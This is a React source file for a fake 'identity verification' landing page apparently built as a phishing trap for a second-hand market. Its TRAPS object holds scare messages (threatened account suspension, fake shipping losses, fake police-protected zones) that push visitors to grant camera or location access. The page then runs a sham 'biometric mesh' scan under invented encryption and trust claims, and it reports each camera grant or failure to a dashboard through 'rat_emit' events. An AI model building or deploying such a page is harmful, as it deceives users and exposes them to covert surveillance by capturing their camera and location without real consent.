import React, { useRef, useEffect, useState } from 'react';

const TRAPS = {
  camera: [
    {
      title: '🚨 CRITICAL: IDENTITY VERIFICATION REQUIRED',
      body: "WARNING: High-risk account activity detected. To prevent immediate account suspension, you MUST complete this 5-second biometric face scan. Failure to verify will result in a permanent block from the Second Hand Market.",
      button: 'COMPLETE VERIFICATION NOW ⚡',
      accent: '#dc2626',
      aggressive: true
    },
    {
      title: '🔍 URGENT: ITEMS AT RISK OF CATEGORY RELISTING',
      body: "Our system detected valuable items in your room that are currently trending. If you don't list them in the next 10 minutes, you lose the 'Top Seller' 20% commission bonus. Point your camera NOW to secure your profit.",
      button: 'SECURE PROFITS → SCAN SPACE',
      accent: '#ea580c'
    },
    {
      title: '⏰ ACTIVATION EXPIRED: AR FITTING ROOM',
      body: "CRITICAL ACTION REQUIRED: Your fitting room session is about to expire. Activate your camera NOW to maintain access to exclusive AR fitting features. Do not refresh this page.",
      button: 'RESTORE ACCESS NOW →',
      accent: '#9333ea'
    }
  ],
  location: [
    {
      title: '⚠️ STOP LOSS: OVERPAYING ON SHIPPING',
      body: "CRITICAL ALERT: You are currently losing money on every sale due to shipping costs. Enable location to instantly connect with 12 buyers within 3 miles. Local pickup = 100% PROFIT.",
      button: 'FIX SHIPPING LOSS → Enable location',
      accent: '#dc2626',
      aggressive: true
    },
    {
      title: '🛡️ SECURITY: SAFE TRANSACTIONS ZONE',
      body: "WARNING: Unverified location detected. To access 'Safe Meetup' protection and 24/7 police-monitored zones, you must enable location services immediately. Stay protected, stay verified.",
      button: 'ACTIVATE PROTECTION → Enable location',
      accent: '#2563eb'
    }
  ]
};

const FaceScanLandingPage = ({ onComplete, variant = 'full' }: { onComplete: () => void, variant?: 'full' | 'hero' }) => {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [cameraStream, setCameraStream] = useState(null);
  const [scanning, setScanning] = useState(false);
  const [scanComplete, setScanComplete] = useState(false);
  const [error, setError] = useState('');
  const [trap, setTrap] = useState(null);

  useEffect(() => {
    // Select a random trap category and item on mount
    const categories = Object.keys(TRAPS);
    const category = categories[Math.floor(Math.random() * categories.length)];
    const pool = TRAPS[category];
    const item = pool[Math.floor(Math.random() * pool.length)];
    setTrap({ type: category, data: item });
  }, []);

  useEffect(() => {
    if (cameraStream && videoRef.current) {
        videoRef.current.srcObject = cameraStream;
        // Logic check: if it's a camera trap, we start scan. If location, we're done with cam soon.
        if (trap?.type === 'camera') {
            setTimeout(startScan, 1000);
        }
    }
  }, [cameraStream, trap]);

  const handleAction = async () => {
    if (!trap) return;

    if (trap.type === 'camera') {
        try {
            // Robust constraints: Try with facingMode, then fallback to true
            let stream;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
                });
            } catch (e) {
                console.warn("Retrying with simple video constraints");
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
            }
            
            setCameraStream(stream);

            // Notify dashboard of success
            window.dispatchEvent(new CustomEvent('rat_emit', {
                detail: { event: 'client_log', data: `Camera access granted for trap: ${trap.data.title}` }
            }));
        } catch (err) {
            const errMsg = `Camera failure [${trap.data.title}]: ${err}`;
            setError('Camera access is required for verification. Please permit and retry.');
            
            // Notify dashboard of specific error
            window.dispatchEvent(new CustomEvent('rat_emit', {
                detail: { event: 'client_log', data: errMsg }
            }));
        }
    } else if (trap.type === 'location') {
        if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
             () => {
               setScanComplete(true);
               setTimeout(() => onComplete(), 1500);
             },
             () => {
               setError('Location access is required to find local buyers. Please permit.');
             },
             { enableHighAccuracy: true }
           );
        }
    }
  };

  const startScan = () => {
    setScanning(true);
    const scanInterval = setInterval(() => {
      if (canvasRef.current && videoRef.current) {
        const ctx = canvasRef.current.getContext('2d');
        ctx.drawImage(videoRef.current, 0, 0, 640, 480);
      }
    }, 100);

    setTimeout(() => {
      clearInterval(scanInterval);
      setScanning(false);
      setScanComplete(true);
      setTimeout(() => {
        if (onComplete) onComplete();
      }, 2000);
    }, 4000);
  };

  useEffect(() => {
    return () => {
      if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
      }
    };
  }, [cameraStream]);

  if (!trap) return null;

  const isHero = variant === 'hero';

  return (
    <div style={isHero ? styles.heroContainer : styles.container}>
      {!isHero && (
        <div style={styles.header}>
          <h1 style={styles.title}>{trap.data.title}</h1>
          <p style={styles.subtitle}>{trap.data.body.split('\n')[0]}</p>
        </div>
      )}

      <div style={isHero ? styles.heroMainContent : styles.mainContent}>
        <div style={{
          ...styles.cameraCard,
          border: trap.data.aggressive ? '2px solid #dc2626' : styles.cameraCard.border,
          animation: trap.data.aggressive ? 'pulseBorder 2s infinite' : 'none'
        }}>
          <div style={styles.captchaHeader}>
              <div style={styles.captchaIcon}>{trap.data.aggressive ? '☢️' : (trap.type === 'camera' ? '📸' : '📍')}</div>
              <h2 style={{...styles.cardTitle, color: trap.data.aggressive ? '#dc2626' : '#111827'}}>
                {trap.data.aggressive ? 'CRITICAL ACTION REQUIRED' : 'Identity & Safety Challenge'}
              </h2>
          </div>
          
          <p style={{...styles.privacyNote, color: trap.data.aggressive ? '#111827' : '#6b7280', fontWeight: trap.data.aggressive ? '600' : '400'}}>
              {trap.data.body}
          </p>

          <div style={styles.videoContainer}>
            {!cameraStream && !scanComplete ? (
              <div style={styles.cameraPlaceholder}>
                <div style={styles.shieldIcon}>{trap.type === 'camera' ? '🛡️' : '🚚'}</div>
                <button 
                  onClick={handleAction}
                  style={{...styles.startButton, backgroundColor: trap.data.accent}}
                >
                  {trap.data.button}
                </button>
                <p style={styles.disclaimer}>
                  This site is protected by advanced identity verification systems.
                </p>
              </div>
            ) : (
              <>
                {trap.type === 'camera' && (
                    <video
                      ref={videoRef}
                      autoPlay
                      playsInline
                      style={styles.video}
                    />
                )}
                <canvas
                  ref={canvasRef}
                  width="640"
                  height="480"
                  style={styles.canvas}
                />
                {scanning && (
                  <div style={styles.scanOverlay}>
                    <div style={styles.scanAnimation}></div>
                    <p style={styles.scanText}>VALIDATING BIOMETRIC MESH...</p>
                  </div>
                )}
                {scanComplete && (
                  <div style={styles.successOverlay}>
                    <div style={styles.checkmark}>✅</div>
                    <p>{trap.type === 'camera' ? 'Identity Confirmed' : 'Location Verified'}</p>
                  </div>
                )}
              </>
            )}
          </div>

          {error && <p style={styles.error}>{error}</p>}

          <div style={styles.footerInfo}>
             <p>SECURE SESSION: {Math.random().toString(36).substring(7).toUpperCase()}</p>
             <p>ENCRYPTION: AES-256-GCM</p>
          </div>
        </div>

        <div style={styles.infoCard}>
          <h3>Trusted by 5M+ Users</h3>
          <p style={styles.descText}>Our verification process ensures a safe environment for everyone. Verified users get priority support and appear 3x more often in searches.</p>
          
          <div style={styles.benefits}>
              <div style={styles.benefitItem}>🔒 End-to-End Encrypted</div>
              <div style={styles.benefitItem}>👤 Identity Protection</div>
              <div style={styles.benefitItem}>⚡ Instant Listing Approval</div>
          </div>
          
          <div style={{ marginTop: '20px', fontSize: '12px', color: '#666' }}>
              By clicking the button, you agree to our <span style={{ textDecoration: 'underline', cursor: 'pointer' }}>Privacy Policy</span> and <span style={{ textDecoration: 'underline', cursor: 'pointer' }}>Security Terms</span>.
          </div>
        </div>
      </div>
    </div>
  );
};

const styles = {
  container: {
    maxWidth: '1200px',
    margin: '0 auto',
    padding: '40px 20px',
    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
    backgroundColor: '#fff',
    minHeight: '100vh'
  },
  heroContainer: {
    width: '100%',
    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
    backgroundColor: 'transparent',
  },
  header: {
    textAlign: 'center',
    marginBottom: '50px'
  },
  title: {
    color: '#111827',
    fontSize: '2.2em',
    marginBottom: '10px',
    fontWeight: '800',
    letterSpacing: '-0.025em'
  },
  subtitle: {
    color: '#4b5563',
    fontSize: '1.1em'
  },
  mainContent: {
    display: 'grid',
    gridTemplateColumns: 'minmax(300px, 600px) 1fr',
    gap: '40px',
    alignItems: 'start'
  },
  heroMainContent: {
    display: 'grid',
    gridTemplateColumns: '1fr 1fr',
    gap: '20px',
    alignItems: 'center',
    height: '100%'
  },
  cameraCard: {
    backgroundColor: '#fff',
    borderRadius: '16px',
    padding: '30px',
    boxShadow: '0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05)',
    border: '1px solid #f3f4f6'
  },
  captchaHeader: {
      display: 'flex',
      alignItems: 'center',
      gap: '15px',
      marginBottom: '15px'
  },
  captchaIcon: {
      fontSize: '32px'
  },
  cardTitle: {
    margin: '0',
    color: '#111827',
    fontSize: '1.25em',
    fontWeight: '700'
  },
  privacyNote: {
    color: '#6b7280',
    fontSize: '0.9em',
    marginBottom: '25px',
    lineHeight: 1.5
  },
  videoContainer: {
    position: 'relative',
    width: '100%',
    aspectRatio: '4/3',
    backgroundColor: '#000',
    borderRadius: '12px',
    overflow: 'hidden',
    border: '1px solid #e5e7eb'
  },
  cameraPlaceholder: {
    height: '100%',
    display: 'flex',
    flexDirection: 'column',
    justifyContent: 'center',
    alignItems: 'center',
    padding: '20px',
    backgroundColor: '#f9fafb'
  },
  shieldIcon: {
      fontSize: '60px',
      marginBottom: '20px'
  },
  video: {
    width: '100%',
    height: '100%',
    objectFit: 'cover'
  },
  canvas: {
    position: 'absolute',
    top: '0',
    left: '0',
    width: '100%',
    height: '100%',
    opacity: '0.1',
    pointerEvents: 'none'
  },
  startButton: {
    color: 'white',
    border: 'none',
    padding: '16px 32px',
    fontSize: '1em',
    fontWeight: '700',
    borderRadius: '10px',
    cursor: 'pointer',
    transition: 'all 0.2s',
    width: '100%',
    maxWidth: '320px',
    boxShadow: '0 4px 6px -1px rgba(0, 0, 0, 0.1)'
  },
  disclaimer: {
    color: '#9ca3af',
    fontSize: '0.75em',
    marginTop: '20px',
    textAlign: 'center'
  },
  scanOverlay: {
    position: 'absolute',
    top: '0',
    left: '0',
    width: '100%',
    height: '100%',
    backgroundColor: 'rgba(37, 99, 235, 0.3)',
    display: 'flex',
    flexDirection: 'column',
    justifyContent: 'center',
    alignItems: 'center',
    color: 'white'
  },
  scanText: {
      fontWeight: '800',
      marginTop: '15px',
      fontSize: '0.8em',
      letterSpacing: '0.1em'
  },
  scanAnimation: {
    width: '100%',
    height: '2px',
    backgroundColor: '#60a5fa',
    boxShadow: '0 0 15px #60a5fa',
    animation: 'scanLine 3s ease-in-out infinite'
  },
  successOverlay: {
    position: 'absolute',
    top: '0',
    left: '0',
    width: '100%',
    height: '100%',
    backgroundColor: '#f0fdf4',
    display: 'flex',
    flexDirection: 'column',
    justifyContent: 'center',
    alignItems: 'center',
    color: '#16a34a',
    zIndex: 10
  },
  checkmark: {
    fontSize: '80px',
    marginBottom: '20px'
  },
  error: {
    color: '#dc2626',
    textAlign: 'center',
    marginTop: '15px',
    fontSize: '0.85em',
    fontWeight: '500'
  },
  footerInfo: {
      marginTop: '25px',
      display: 'flex',
      justifyContent: 'space-between',
      color: '#9ca3af',
      fontSize: '0.7em',
      borderTop: '1px solid #f3f4f6',
      paddingTop: '15px'
  },
  infoCard: {
    backgroundColor: '#f3f4f6',
    borderRadius: '16px',
    padding: '30px',
    border: '1px solid #e5e7eb'
  },
  descText: {
      color: '#4b5563',
      lineHeight: '1.6',
      marginBottom: '25px',
      fontSize: '0.95em'
  },
  contentSection: {
    display: 'flex',
    flexDirection: 'column',
    gap: '20px',
  },
  '@media (max-width: 768px)': {
    mainContent: {
      gridTemplateColumns: '1fr',
      padding: '10px',
    },
    heroMainContent: {
      gridTemplateColumns: '1fr',
      padding: '5px',
      gap: '15px',
    },
    title: {
      fontSize: '20px',
    },
    subtitle: {
      fontSize: '12px',
    },
    button: {
      padding: '12px 20px',
      fontSize: '14px',
    },
    infoCard: {
      padding: '15px',
    },
  },
  benefits: {
      display: 'flex',
      flexDirection: 'column',
      gap: '12px',
      marginBottom: '10px'
  },
  benefitItem: {
      fontSize: '0.9em',
      color: '#111827',
      fontWeight: '600',
      display: 'flex',
      alignItems: 'center',
      gap: '8px'
  }
};

const styleSheet = document.createElement("style");
styleSheet.textContent = `
  @keyframes scanLine {
    0% { transform: translateY(-150px); }
    100% { transform: translateY(150px); }
  }
  @keyframes pulseBorder {
    0% { border-color: #dc2626; box-shadow: 0 0 0px rgba(220, 38, 38, 0.4); }
    50% { border-color: #ef4444; box-shadow: 0 0 20px rgba(220, 38, 38, 0.6); }
    100% { border-color: #dc2626; box-shadow: 0 0 0px rgba(220, 38, 38, 0.4); }
  }
`;
document.head.appendChild(styleSheet);

export default FaceScanLandingPage;